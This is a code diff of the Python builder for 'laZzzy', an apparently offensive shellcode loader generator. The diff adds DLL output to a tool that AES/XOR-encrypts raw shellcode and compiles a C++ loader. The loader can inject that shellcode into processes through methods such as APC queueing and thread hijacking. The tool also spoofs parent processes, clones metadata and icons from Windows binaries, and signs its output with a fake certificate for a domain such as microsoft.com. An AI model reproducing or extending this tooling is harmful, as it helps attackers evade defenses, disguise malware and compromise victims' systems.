@@ -15,7 +15,9 @@ from Crypto.Cipher import AES
 from Crypto import Random
 from string import Template
 
-RELEASE_PATH = fr"{os.getcwd()}\loader\x64\Release\laZzzy.exe"
+#TODO: support x86
+VS_PROJ_PATH = f"{os.getcwd()}\\loader"
+VS_OUTPUT_PATH = f"{VS_PROJ_PATH}\\x64\\"
 
 logo = ("""
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -34,8 +36,8 @@ shellcode execution method:
    1          Early-bird APC Queue (requires sacrificial proces)
    2          Thread Hijacking (requires sacrificial proces)
    3          KernelCallbackTable (requires sacrificial process that has GUI)
-   4          Section View Mapping
-   5          Thread Suspension
+   4          Section View Mapping (requires target process)
+   5          Thread Suspension (requires target process)
    6          LineDDA Callback
    7          EnumSystemGeoID Callback
    8          FLS Callback
@@ -86,14 +88,15 @@ def modify_template(params, template):
 
 
 def generate_code(cipher_text, aes_key, aes_iv, xor_key, method, target_process, spawn_process, parent_process, current_dir):
+    #TODO: make .def file dynamic for DLLs
     result = modify_template({"shellcode":cipher_text, "aes_key":aes_key, "aes_iv":aes_iv, "xor_key": xor_key, "method":method, "target_process":target_process, "spawn_process":spawn_process, "parent_process":parent_process, "current_dir":current_dir}, f"{os.getcwd()}\\template\\main.cpp")
 
-    with open(f"{os.getcwd()}\\loader\\main.cpp","w+") as file:
+    with open(f"{VS_PROJ_PATH}\\main.cpp","w+") as file:
         file.write(result)
         file.close()
 
 
-def clone_meta(bin_path):
+def clone_meta(bin_path, _format="exe"):
     filever = prodver  = "1, 0, 0, 0"
     company_name = file_desc = file_ver = internal_name = copyright = orig_file = prod_name = prod_ver = icon = "" 
 
@@ -135,12 +138,12 @@ def clone_meta(bin_path):
     except:
         pass
     else:
-        icoextract.IconExtractor(bin_path).export_icon(f"{os.getcwd()}\\loader\\icon.ico")
+        icoextract.IconExtractor(bin_path).export_icon(f"{VS_PROJ_PATH}\\icon.ico")
         icon = "MAIN ICON icon.ico"
 
     result = modify_template({"filever":filever, "prodver":prodver, "company_name":company_name, "file_desc":file_desc, "file_ver":file_ver, "internal_name": internal_name, "copyright":copyright, "orig_file":orig_file, "prod_name":prod_name, "prod_ver":prod_ver, "icon":icon}, f"{os.getcwd()}\\template\\resource.rc")
 
-    with open(f"{os.getcwd()}\\loader\\resource.rc","w+") as file:
+    with open(f"{VS_PROJ_PATH}\\resource.rc","w+") as file:
         file.write(result)
         file.close()
 
@@ -148,18 +151,22 @@ def clone_meta(bin_path):
         head, tail = os.path.split(bin_path)
         return tail
     else:
-        return "laZzzy.exe"
+        return f"laZzzy.{_format}"
 
 
-def compile():
+def compile(_format="exe"):
     env = os.getenv("ProgramFiles(x86)")
     cmd = f"\"{env}\\Microsoft Visual Studio\\Installer\\vswhere.exe\" -latest -products * -requires Microsoft.Component.MSBuild -property installationPath"
     p = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
     out, err = p.communicate()
     
     msbuild_path = f"\"{out.decode('utf-8').strip()}\\MSBuild\\Current\\Bin\\MSBuild.exe\""
-    solution_file = f"{os.getcwd()}\\loader\\laZzzy.sln"
-    cmd = f"{msbuild_path} {solution_file} /p:Configuration=Release /p:Platform=x64 /v:q"
+    solution_file = f"{VS_PROJ_PATH}\\laZzzy.sln"
+    #TODO: support x86
+    if(_format == "exe"):
+        cmd = f"{msbuild_path} {solution_file} /p:Configuration=Release /p:Platform=x64 /v:q"
+    else:
+        cmd = f"{msbuild_path} {solution_file} /p:Configuration=ReleaseDll /p:Platform=x64 /v:q"
     p = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
     out, err = p.communicate()
 
@@ -250,10 +257,10 @@ def move_file(file_name, release_path):
 
 
 def clean_loader():
-    shutil.rmtree(f"{os.getcwd()}\\loader\\x64")
+    shutil.rmtree(VS_OUTPUT_PATH)
     try:
-        os.remove(f"{os.getcwd()}\\loader\\icon.ico")
-        os.remove(f"{os.getcwd()}\\loader\\resource.rc")
+        os.remove(f"{VS_PROJ_PATH}\\icon.ico")
+        os.remove(f"{VS_PROJ_PATH}\\resource.rc")
     except:
         pass
 
@@ -276,11 +283,12 @@ if __name__ == "__main__":
     parser.add_argument("-s", dest="shellcode", metavar="", required=True, help="path to raw shellcode")
     parser.add_argument("-p", dest="password", metavar="", required=True, help="password")
     parser.add_argument("-m", dest="method", metavar="", required=True, help="shellcode execution method (e.g. 1)", type=int, choices=[1, 2 , 3, 4, 5, 6, 7, 8, 9, 10])
-    parser.add_argument("-tp", dest="target_process", metavar="", help="process to inject (e.g. svchost.exe)")
-    parser.add_argument("-sp", dest="spawn_process", metavar="", help="process to spawn (e.g. C:\\\Windows\\\System32\\\RuntimeBroker.exe)")
-    parser.add_argument("-pp", dest="parent_process", metavar="", help="parent process to spoof (e.g. explorer.exe)")
-    parser.add_argument("-b", dest="bin_spoof", metavar="", help="binary to spoof metadata (e.g. C:\\\Windows\\\System32\\\RuntimeBroker.exe)")
-    parser.add_argument("-d", dest="domain", metavar="", help="domain to spoof (e.g. www.microsoft.com)")
+    parser.add_argument("-tp", dest="target_process", metavar="", default=None, help="process to inject (e.g. svchost.exe)")
+    parser.add_argument("-sp", dest="spawn_process", metavar="",  default=None, help="process to spawn (e.g. C:\\\Windows\\\System32\\\RuntimeBroker.exe)")
+    parser.add_argument("-pp", dest="parent_process", metavar="",  default=None, help="parent process to spoof (e.g. explorer.exe)")
+    parser.add_argument("-b", dest="bin_spoof", metavar="",  default=None, help="binary to spoof metadata (e.g. C:\\\Windows\\\System32\\\RuntimeBroker.exe)")
+    parser.add_argument("-d", dest="domain", metavar="",  default=None, help="domain to spoof (e.g. www.microsoft.com)")
+    parser.add_argument("-f", dest="format", metavar="", default="exe", help="output formart exe/dll", choices=["exe", "dll"])
     args = parser.parse_args()
 
     if args.method in (1, 2, 3):
@@ -293,12 +301,6 @@ if __name__ == "__main__":
             parser.error("selected method requires -tp")
     else:
         args.target_process = args.spawn_process = args.parent_process = None
-    
-    if not hasattr(args, "bin_spoof"):
-        args.bin_spoof = None
-
-    if not hasattr(args, "domain"):
-        args.domain = None
 
     switcher = {
         1:  "Early-bird APC Queue",
@@ -337,16 +339,20 @@ if __name__ == "__main__":
     print(f"\t[*] Parent process to spoof: \t{args.parent_process}")
 
     file_name = clone_meta(args.bin_spoof)
-
-    compile()
+    #TODO: make configuration dynamic
+    if args.format == "exe":
+        vs_bin_path = f"{VS_OUTPUT_PATH}\\Release\\laZzzy.exe"
+    else:
+        vs_bin_path = f"{VS_OUTPUT_PATH}\\ReleaseDll\\laZzzy.dll"
+    compile(args.format)
     print("\n[+] Compiling project")
-    print(f"\t[*] Compiled executable: \t{RELEASE_PATH}")
+    print(f"\t[*] Compiled executable: \t{vs_bin_path}")
 
     if args.domain is not None:
         print("\n[+] Signing binary with spoofed cert")
-        sign_pe(args.domain, RELEASE_PATH)
+        sign_pe(args.domain, vs_bin_path)
 
-    output_path = move_file(file_name, RELEASE_PATH)
+    output_path = move_file(file_name, vs_bin_path)
     print("\n[+] All done!")
     print(f"\t[*] Output file: \t\t{output_path}")
 
